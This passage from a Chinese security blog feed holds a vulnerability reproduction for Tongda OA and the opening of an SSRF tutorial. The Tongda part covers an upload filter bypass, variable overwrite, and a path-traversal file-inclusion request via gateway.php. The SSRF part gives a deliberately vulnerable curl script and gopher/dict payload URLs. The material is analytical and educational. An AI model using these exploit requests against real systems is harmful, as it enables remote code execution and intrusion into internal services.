substr($ATTACH_NAME, strrpos($ATTACH_NAME, <span class="string">'.'</span>) + <span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            $encode = mb_detect_encoding($ATTACH_NAME, <span class="keyword">array</span>(<span class="string">'ASCII'</span>, <span class="string">'UTF-8'</span>, <span class="string">'GB2312'</span>, <span class="string">'GBK'</span>, <span class="string">'BIG5'</span>));</span><br><span class="line">            <span class="keyword">if</span> ($encode != <span class="string">'UTF-8'</span>) &#123;</span><br><span class="line">                $ATTACH_NAME_UTF8 = mb_convert_encoding($ATTACH_NAME, <span class="string">'utf-8'</span>, MYOA_CHARSET);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $ATTACH_NAME_UTF8 = $ATTACH_NAME;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/[\\\':&lt;&gt;?]|\\/|\\\\|"|\\|/u'</span>, $ATTACH_NAME_UTF8)) &#123;</span><br><span class="line">                $ERROR_DESC = sprintf(_(<span class="string">'文件名[%s]包含[/\\\'":*?&lt;&gt;|]等非法字符'</span>), $ATTACH_NAME);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($ATTACH_SIZE == <span class="number">0</span>) &#123;</span><br><span class="line">                $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]大小为0字节'</span>), $ATTACH_NAME);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($ERROR_DESC == <span class="string">''</span>) &#123;</span><br><span class="line">                $ATTACH_NAME = str_replace(<span class="string">'\''</span>, <span class="string">''</span>, $ATTACH_NAME);</span><br><span class="line">                $ATTACH_ID = add_attach($ATTACH_FILE, $ATTACH_NAME, $MODULE);</span><br><span class="line">                <span class="keyword">if</span> ($ATTACH_ID === <span class="keyword">false</span>) &#123;</span><br><span class="line">                    $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]上传失败'</span>), $ATTACH_NAME);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $ATTACHMENTS[<span class="string">'ID'</span>] .= $ATTACH_ID . <span class="string">','</span>;</span><br><span class="line">                    $ATTACHMENTS[<span class="string">'NAME'</span>] .= $ATTACH_NAME . <span class="string">'*'</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            @unlink($ATTACH_FILE);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_INI_SIZE) &#123;</span><br><span class="line">                $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]的大小超过了系统限制（%s）'</span>), $ATTACH_NAME, ini_get(<span class="string">'upload_max_filesize'</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_FORM_SIZE) &#123;</span><br><span class="line">                    $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]的大小超过了表单限制'</span>), $ATTACH_NAME);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_PARTIAL) &#123;</span><br><span class="line">                        $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]上传不完整'</span>), $ATTACH_NAME);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_NO_TMP_DIR) &#123;</span><br><span class="line">                            $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]上传失败：找不到临时文件夹'</span>), $ATTACH_NAME);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_CANT_WRITE) &#123;</span><br><span class="line">                                $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]写入失败'</span>), $ATTACH_NAME);</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                $ERROR_DESC = sprintf(_(<span class="string">'未知错误[代码：%s]'</span>), $ATTACH_ERROR);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($ERROR_DESC != <span class="string">''</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!$OUTPUT) &#123;</span><br><span class="line">                delete_attach($ATTACHMENTS[<span class="string">'ID'</span>], $ATTACHMENTS[<span class="string">'NAME'</span>], $MODULE);</span><br><span class="line">                <span class="keyword">return</span> $ERROR_DESC;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Message(_(<span class="string">'错误'</span>), $ERROR_DESC);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $ATTACHMENTS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>看下is_uploadable()函数对文件名进行检查，跟进到该函数，同样位于inc/utility_file.php</li></ul><p><img src="https://img-blog.csdnimg.cn/20200330095139194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>这个仔细看一下，代码意思是查找 “.” 在文件名中最后一次出现的位置然后</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strtolower(substr($FILE_NAME, $POS + 1, 3)) &#x3D;&#x3D; &#39;php&#39;</span><br></pre></td></tr></table></figure><ul><li>这是 substr( 文件名,最后一次点的位置+1,3个位置)</li><li>从存在 ”.“ 开始匹配3位，判断后缀是否为php，,如果为php则返回false,否则将”.”之前的作为EXT_NAME。</li></ul><p><img src="https://img-blog.csdnimg.cn/20200330095216717.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>这么判断 .php肯定是不行了，只能是 shell.php. 或者 shell.php.png</li><li>那么只能是配合文件包含漏洞了</li></ul><h2 id="变量传递问题"><a href="#变量传递问题" class="headerlink" title="变量传递问题"></a>变量传递问题</h2><ul><li><p>由于在upload.php中UPLOAD_MODE值的是一个重要的流程走向的判断</p></li><li><p>但是并没有发现是从哪来的，所以一直很疑惑，</p></li><li><p>但根据payload中POST的UPLOAD_MODE值可以被正常带入且影响文件上传走向</p></li><li><p>预测 UPLOAD_MODE值的方法存在于被包含的文件中,</p></li><li><p>但是UPLOAD_MODE这个参数名仅存在于upload.php中</p></li></ul><ul><li><p>开始追溯，发现下面的路径</p></li><li><p>具体调用为upload.php -&gt; session.php -&gt; coon.php -&gt; td_config.php -&gt; common.inc.php</p></li></ul><p>关键部分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">if (0 &lt; count($_POST)) &#123;</span><br><span class="line">    $arr_html_fields &#x3D; array();</span><br><span class="line">    foreach ($_POST as $s_key &#x3D;&gt; $s_value) &#123;</span><br><span class="line">        if (substr($s_key, 0, 7) &#x3D;&#x3D; &#39;_SERVER&#39;) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        if (substr($s_key, 0, 15) !&#x3D; &#39;TD_HTML_EDITOR_&#39;) &#123;</span><br><span class="line">            if (!is_array($s_value)) &#123;</span><br><span class="line">                $_POST[$s_key] &#x3D; addslashes(strip_tags($s_value));</span><br><span class="line">            &#125;</span><br><span class="line">            $&#123;$s_key&#125; &#x3D; $_POST[$s_key];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            if ($s_key &#x3D;&#x3D; &#39;TD_HTML_EDITOR_FORM_HTML_DATA&#39; || $s_key &#x3D;&#x3D; &#39;TD_HTML_EDITOR_PRCS_IN&#39; || $s_key &#x3D;&#x3D; &#39;TD_HTML_EDITOR_PRCS_OUT&#39; || $s_key &#x3D;&#x3D; &#39;TD_HTML_EDITOR_QTPL_PRCS_SET&#39; || isset($_POST[&#39;ACTION_TYPE&#39;]) &amp;&amp; ($_POST[&#39;ACTION_TYPE&#39;] &#x3D;&#x3D; &#39;approve_center&#39; || $_POST[&#39;ACTION_TYPE&#39;] &#x3D;&#x3D; &#39;workflow&#39; || $_POST[&#39;ACTION_TYPE&#39;] &#x3D;&#x3D; &#39;sms&#39; || $_POST[&#39;ACTION_TYPE&#39;] &#x3D;&#x3D; &#39;wiki&#39;) &amp;&amp; ($s_key &#x3D;&#x3D; &#39;CONTENT&#39; || $s_key &#x3D;&#x3D; &#39;TD_HTML_EDITOR_CONTENT&#39; || $s_key &#x3D;&#x3D; &#39;TD_HTML_EDITOR_TPT_CONTENT&#39;)) &#123;</span><br><span class="line">                unset($_POST[$s_key]);</span><br><span class="line">                $s_key &#x3D; $s_key &#x3D;&#x3D; &#39;CONTENT&#39; ? $s_key : substr($s_key, 15);</span><br><span class="line">                $&#123;$s_key&#125; &#x3D; addslashes($s_value);</span><br><span class="line">                $arr_html_fields[$s_key] &#x3D; $&#123;$s_key&#125;;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $encoding &#x3D; mb_detect_encoding($s_value, &#39;GBK,UTF-8&#39;);</span><br><span class="line">                unset($_POST[$s_key]);</span><br><span class="line">                $s_key &#x3D; substr($s_key, 15);</span><br><span class="line">                $&#123;$s_key&#125; &#x3D; addslashes(rich_text_clean($s_value, $encoding));</span><br><span class="line">                $arr_html_fields[$s_key] &#x3D; $&#123;$s_key&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    reset($_POST);</span><br><span class="line">    $_POST &#x3D; array_merge($_POST, $arr_html_fields);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>首先一开始对$_POST长度进行了判断,这里$_POST实际是一个数组,接着使用foreach函数对数组进行遍历,</li><li>在这里$_POST数组中key为”UPLOAD_MODE”,value为”2”,那么根据配会到</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (substr($s_key, 0, 15) !&#x3D; &#39;TD_HTML_EDITOR_&#39;) &#123;</span><br><span class="line">            if (!is_array($s_value)) &#123;</span><br><span class="line">                $_POST[$s_key] &#x3D; addslashes(strip_tags($s_value));</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            &#x2F;&#x2F;直接来这</span><br><span class="line">            $&#123;$s_key&#125; &#x3D; $_POST[$s_key];</span><br></pre></td></tr></table></figure><ul><li>最终数组键名UPLOAD_MODE成了了变量名,而他的对应键值成为了变量值</li><li>所以 upload.php 未直接接收UPLOAD_MODE值,而我们仍可以传递到这里</li></ul><ul><li>upload函数的中 调用 add_attach函数，设置$ATTACHMENTS[‘ID’] </li></ul><p><img src="https://img-blog.csdnimg.cn/20200330095243732.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p><ul><li>再往后 继续跟进函数add_attach，函数同样位于inc/utility_file.php文件下</li><li>找到了保存路径的方式</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">function add_attach($SOURCE_FILE, $ATTACH_NAME, $MODULE, $YM, $ATTACH_SIGN, $ATTACH_ID)</span><br><span class="line">&#123;</span><br><span class="line">    $ATTACH_PARA_ARRAY &#x3D; TD::get_cache(&quot;SYS_ATTACH_PARA&quot;);</span><br><span class="line">    $ATTACH_POS_ACTIVE &#x3D; $ATTACH_PARA_ARRAY[&quot;SYS_ATTACH_POS_ACTIVE&quot;];</span><br><span class="line">    $ATTACH_PATH_ACTIVE &#x3D; $ATTACH_PARA_ARRAY[&quot;SYS_ATTACH_PATH_ACTIVE&quot;];</span><br><span class="line"></span><br><span class="line">    if (!file_exists($SOURCE_FILE)) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ($MODULE &#x3D;&#x3D; &quot;&quot;) &#123;</span><br><span class="line">        $MODULE &#x3D; attach_sub_dir();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ($YM &#x3D;&#x3D; &quot;&quot;) &#123;</span><br><span class="line">        $YM &#x3D; date(&quot;ym&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $PATH &#x3D; $ATTACH_PATH_ACTIVE . $MODULE;</span><br><span class="line">    if (!file_exists($PATH) || !is_dir($PATH)) &#123;</span><br><span class="line">        @mkdir($PATH, 448);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $PATH &#x3D; $PATH . &quot;&#x2F;&quot; . $YM;</span><br><span class="line">    if (!file_exists($PATH) || !is_dir($PATH)) &#123;</span><br><span class="line">        @mkdir($PATH, 448);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ATTACH_NAME &#x3D; (is_default_charset($ATTACH_NAME) ? $ATTACH_NAME : iconv(&quot;utf-8&quot;, MYOA_CHARSET, $ATTACH_NAME));</span><br><span class="line">    $EXT_NAME &#x3D; substr($ATTACH_NAME, strrpos($ATTACH_NAME, &quot;.&quot;));</span><br><span class="line">    $ATTACH_NAME &#x3D; str_replace($EXT_NAME, strtolower($EXT_NAME), $ATTACH_NAME);</span><br><span class="line">    $ATTACH_FILE &#x3D; (MYOA_ATTACH_NAME_FORMAT ? md5($ATTACH_NAME) . &quot;.td&quot; : $ATTACH_NAME);</span><br><span class="line">    $ATTACH_ID &#x3D; mt_rand();</span><br><span class="line">    $FILENAME &#x3D; $PATH . &quot;&#x2F;&quot; . $ATTACH_ID . &quot;.&quot; . $ATTACH_FILE;</span><br><span class="line"></span><br><span class="line">    if (file_exists($FILENAME)) &#123;</span><br><span class="line">        $ATTACH_ID &#x3D; mt_rand();</span><br><span class="line">        $FILENAME &#x3D; $PATH . &quot;&#x2F;&quot; . $ATTACH_ID . &quot;.&quot; . $ATTACH_FILE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $AID &#x3D; mysql_insert_id();</span><br><span class="line">    $ATTACH_ID_NEW &#x3D; $AID . &quot;@&quot; . $YM . &quot;_&quot; . $ATTACH_ID;</span><br><span class="line">    return $ATTACH_ID_NEW;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>可以看到返回值$ATTACH_ID_NEW有三部分组成$AID，$YM，$ATTACH_ID</p></li><li><p>其实UPLOAD_MODE值随便为1，2，3中的任意一个数字，都可以返回文件名字和部分路径，不看也行</p></li></ul><h2 id="文件包含部分"><a href="#文件包含部分" class="headerlink" title="文件包含部分"></a>文件包含部分</h2><ul><li>这个比较简单</li><li>文件包含功能的文件位于webroot\ispirit\interface\gateway.php</li><li>具体代码如下：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;decode by http:&#x2F;&#x2F;dezend.qiling.org  QQ 2859470</span><br><span class="line"></span><br><span class="line">ob_start();</span><br><span class="line">include_once &#39;inc&#x2F;session.php&#39;;</span><br><span class="line">include_once &#39;inc&#x2F;conn.php&#39;;</span><br><span class="line">include_once &#39;inc&#x2F;utility_org.php&#39;;</span><br><span class="line">if ($P !&#x3D; &#39;&#39;) &#123;</span><br><span class="line">    if (preg_match(&#39;&#x2F;[^a-z0-9;]+&#x2F;i&#39;, $P)) &#123;</span><br><span class="line">        echo _(&#39;非法参数&#39;);</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    session_id($P);</span><br><span class="line">    session_start();</span><br><span class="line">    session_write_close();</span><br><span class="line">    if ($_SESSION[&#39;LOGIN_USER_ID&#39;] &#x3D;&#x3D; &#39;&#39; || $_SESSION[&#39;LOGIN_UID&#39;] &#x3D;&#x3D; &#39;&#39;) &#123;</span><br><span class="line">        echo _(&#39;RELOGIN&#39;);</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if ($json) &#123;</span><br><span class="line">    $json &#x3D; stripcslashes($json);</span><br><span class="line">    $json &#x3D; (array) json_decode($json);</span><br><span class="line">    foreach ($json as $key &#x3D;&gt; $val) &#123;</span><br><span class="line">        if ($key &#x3D;&#x3D; &#39;data&#39;) &#123;</span><br><span class="line">            $val &#x3D; (array) $val;</span><br><span class="line">            foreach ($val as $keys &#x3D;&gt; $value) &#123;</span><br><span class="line">                $&#123;$keys&#125; &#x3D; $value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if ($key &#x3D;&#x3D; &#39;url&#39;) &#123;</span><br><span class="line">            $url &#x3D; $val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if ($url !&#x3D; &#39;&#39;) &#123;</span><br><span class="line">        if (substr($url, 0, 1) &#x3D;&#x3D; &#39;&#x2F;&#39;) &#123;</span><br><span class="line">            $url &#x3D; substr($url, 1);</span><br><span class="line">        &#125;</span><br><span class="line">        if (strpos($url, &#39;general&#x2F;&#39;) !&#x3D;&#x3D; false || strpos($url, &#39;ispirit&#x2F;&#39;) !&#x3D;&#x3D; false || strpos($url, &#39;module&#x2F;&#39;) !&#x3D;&#x3D; false) &#123;</span><br><span class="line">            include_once $url;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>这里的参数也是，POST直接传入就可以了，分析在上面也有主要是有这两个个就可以</p></li><li><pre><code>include_once &apos;inc/session.php&apos;;include_once &apos;inc/conn.php&apos;;<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 逻辑较为简单，</span><br><span class="line"></span><br><span class="line">- 如果这里不传递参数P为空，就以绕过前面一系列的检测直</span><br><span class="line"></span><br><span class="line">- 随后从json中获取url参数的值</span><br><span class="line"></span><br><span class="line">- 只有 general&#x2F;、ispirit&#x2F;、module&#x2F;  在url内，在直接包含  $url,</span><br><span class="line"></span><br><span class="line">- 文件包含结束</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">构造一个就好了</span><br></pre></td></tr></table></figure>/ispirit/interface/gateway.php?json={&quot;url&quot;:&quot;/general/../../attach/im/2003/1153189608.jpg&quot;}</code></pre><p>0x03 修复方案</p><ul><li>更新官方发布的补丁 <a href="http://www.tongda2000.com/news/673.php" target="_blank" rel="noopener">http://www.tongda2000.com/news/673.php</a></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>浅谈SSRF 加redis反弹shell</title>
      <link href="/2020/03/22/%E6%B5%85%E8%B0%88SSRF%20%E5%8A%A0redis%E5%8F%8D%E5%BC%B9shell/"/>
      <url>/2020/03/22/%E6%B5%85%E8%B0%88SSRF%20%E5%8A%A0redis%E5%8F%8D%E5%BC%B9shell/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-SSRF简介和原理"><a href="#0x00-SSRF简介和原理" class="headerlink" title="0x00 SSRF简介和原理"></a>0x00 SSRF简介和原理</h1><ul><li>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种利用漏洞伪造服务器端发起请求。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</li><li>通过控制功能中的发起请求的服务来当作跳板攻击内网中其他服务。比如，通过控制前台的请求远程地址加载的响应，来让请求数据由远程的URL域名修改为请求本地、或者内网的IP地址及服务，来造成对内网系统的攻击。</li></ul><h1 id="0x01-漏洞危害"><a href="#0x01-漏洞危害" class="headerlink" title="0x01 漏洞危害"></a>0x01 漏洞危害</h1><ol><li><p>扫描内网开放服务</p></li><li><p>向内部任意主机的任意端口发送payload来攻击内网服务</p></li><li><p>攻击内网的web应用，例如直接SQL注入、XSS攻击等</p></li><li><p>利用file、gopher、dict协议读取本地文件、执行命令等</p></li></ol><h1 id="0x02-漏洞常出现的地方"><a href="#0x02-漏洞常出现的地方" class="headerlink" title="0x02 漏洞常出现的地方"></a>0x02 漏洞常出现的地方</h1><p>1.社交分享功能：获取超链接的标题等内容进行显示</p><p>2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p><p>3.在线翻译：给网址翻译对应网页的内容</p><p>4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p><p>5.图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</p><p>6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</p><p>7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p><p>8.数据库内置功能：数据库的比如mongodb的copyDatabase函数</p><p>9.邮件系统：比如接收邮件服务器地址</p><p>10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p><p>11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</p><p>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p><p>12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p><h1 id="0x03漏洞验证"><a href="#0x03漏洞验证" class="headerlink" title="0x03漏洞验证"></a>0x03漏洞验证</h1><p>1、排除法：浏览器f12查看源代码看是否是在本地进行了请求</p><p>比如：该资源地址类型为 <a href="http://www.xxx.com/a.php?image=URL,URL参数若是其他服务器地址就可能存在SSRF漏洞" target="_blank" rel="noopener">http://www.xxx.com/a.php?image=URL,URL参数若是其他服务器地址就可能存在SSRF漏洞</a></p><p>2、dnslog等工具进行测试，看是否被访问(可以在盲打后台，用例中将当前准备请求的url和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求)</p><p>3、抓包分析发送的请求是不是通过服务器发送的，如果不是客户端发出的请求，则有可能是存在漏洞。接着找存在HTTP服务的内网地址</p><p>​    3.1、从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</p><p>​    3.2、通过二级域名暴力猜解工具模糊猜测内网地址</p><p>​    3.3、通过file协议读取内网信息获取相关地址</p><p>4、直接返回的Banner、title、content等信息</p><p>5、留意布尔型SSRF，通过判断两次不同请求结果的差异来判断是否存在SSRF，类似布尔型sql盲注方法。</p><h1 id="0x04简单的测试用例"><a href="#0x04简单的测试用例" class="headerlink" title="0x04简单的测试用例"></a>0x04简单的测试用例</h1><h3 id="创建一个PHP测试脚本，利用curl发送请求"><a href="#创建一个PHP测试脚本，利用curl发送请求" class="headerlink" title="创建一个PHP测试脚本，利用curl发送请求"></a>创建一个PHP测试脚本，利用curl发送请求</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?PHP</span><br><span class="line">$ch &#x3D; curl_init(); </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_GET[&#39;url&#39;]); </span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0); </span><br><span class="line"></span><br><span class="line">curl_exec($ch); </span><br><span class="line">curl_close($ch);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="利用的多种协议"><a href="#利用的多种协议" class="headerlink" title="利用的多种协议"></a>利用的多种协议</h3><h4 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用gopher协议来查看协议，</span><br><span class="line">访问：http:&#x2F;&#x2F;localhost&#x2F;ssrf.php?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:6667&#x2F;_godzzz</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200322104714726.png" alt="&lt;img src=&quot;/Users/zy/Library/Application Support/typora-user-images/image-20200317165932247.png&quot; alt=&quot;image-20200317165932247&quot; style=&quot;zoom:50%;&quot; /&gt;"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用gopher发送POST的请求，</span><br><span class="line">访问：http:&#x2F;&#x2F;localhost&#x2F;ssrf.php?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:6667&#x2F;_POST%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20127.0.0.1%3A2233%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250a%250d%250ausername%3Dadmin%26password%3Dpassword</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200322104735953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="dict协议"><a href="#dict协议" class="headerlink" title="dict协议"></a>dict协议</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dict 协议探测版本</span><br><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;ssrf.php?url&#x3D;dict:&#x2F;&#x2F;127.0.0.1:3306&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200322104817808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>FILE协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 